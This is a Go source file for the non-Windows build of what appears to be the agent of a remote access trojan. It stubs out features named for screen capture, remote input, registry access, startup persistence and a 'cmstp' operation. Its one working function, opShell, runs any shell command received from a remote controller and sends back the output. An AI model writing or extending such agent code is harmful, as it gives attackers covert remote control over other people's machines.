//go:build agent && !windows
// +build agent,!windows

package main

import (
	"errors"
	"os/exec"
	"syscall"

	"multifs-advanced/internal/protocol"
)

var errNotSupported = errors.New("not supported on this platform")

func (a *agent) opPower(req *protocol.Request)          { a.replyErr(req.ID, errNotSupported.Error()) }
func (a *agent) opFun(req *protocol.Request)            { a.replyErr(req.ID, errNotSupported.Error()) }
func (a *agent) opMessageBox(req *protocol.Request)     { a.replyErr(req.ID, errNotSupported.Error()) }
func (a *agent) opScreenCapture(req *protocol.Request)  { a.replyErr(req.ID, errNotSupported.Error()) }
func (a *agent) opRemoteInput(req *protocol.Request)    { a.replyErr(req.ID, errNotSupported.Error()) }
func (a *agent) opProcesses(req *protocol.Request)      { a.replyErr(req.ID, errNotSupported.Error()) }
func (a *agent) opProcessKill(req *protocol.Request)    { a.replyErr(req.ID, errNotSupported.Error()) }
func (a *agent) opProcessRun(req *protocol.Request)     { a.replyErr(req.ID, errNotSupported.Error()) }
func (a *agent) opRegistry(req *protocol.Request)       { a.replyErr(req.ID, errNotSupported.Error()) }
func (a *agent) opRegistryRead(req *protocol.Request)   { a.replyErr(req.ID, errNotSupported.Error()) }
func (a *agent) opStartup(req *protocol.Request)        { a.replyErr(req.ID, errNotSupported.Error()) }
func (a *agent) opStartupRemove(req *protocol.Request)  { a.replyErr(req.ID, errNotSupported.Error()) }
func (a *agent) opCmstp(req *protocol.Request)          { a.replyErr(req.ID, errNotSupported.Error()) }
func (a *agent) opLogs(req *protocol.Request)           { a.replyErr(req.ID, errNotSupported.Error()) }
func (a *agent) opAgentRelaunch(req *protocol.Request)  { a.replyErr(req.ID, errNotSupported.Error()) }
func (a *agent) opAgentUninstall(req *protocol.Request) { a.replyErr(req.ID, errNotSupported.Error()) }

func (a *agent) opAgentStartupInstall(req *protocol.Request) {
	a.replyErr(req.ID, errNotSupported.Error())
}
func (a *agent) opAgentStartupUninstall(req *protocol.Request) {
	a.replyErr(req.ID, errNotSupported.Error())
}
func (a *agent) opAgentStartupStatus(req *protocol.Request) {
	a.replyErr(req.ID, errNotSupported.Error())
}

func (a *agent) opShell(req *protocol.Request) {
	command, _ := req.Args["command"].(string)
	if command == "" {
		a.replyErr(req.ID, "missing command")
		return
	}

	cmd := exec.Command("sh", "-c", command)
	cmd.SysProcAttr = &syscall.SysProcAttr{}
	output, err := cmd.CombinedOutput()

	result := map[string]any{"output": string(output)}
	if err != nil {
		result["error"] = err.Error()
	}
	a.replyOK(req.ID, result)
}

func (a *agent) opAgentClose(req *protocol.Request) {
	a.replyOK(req.ID, map[string]any{"closing": true})
}
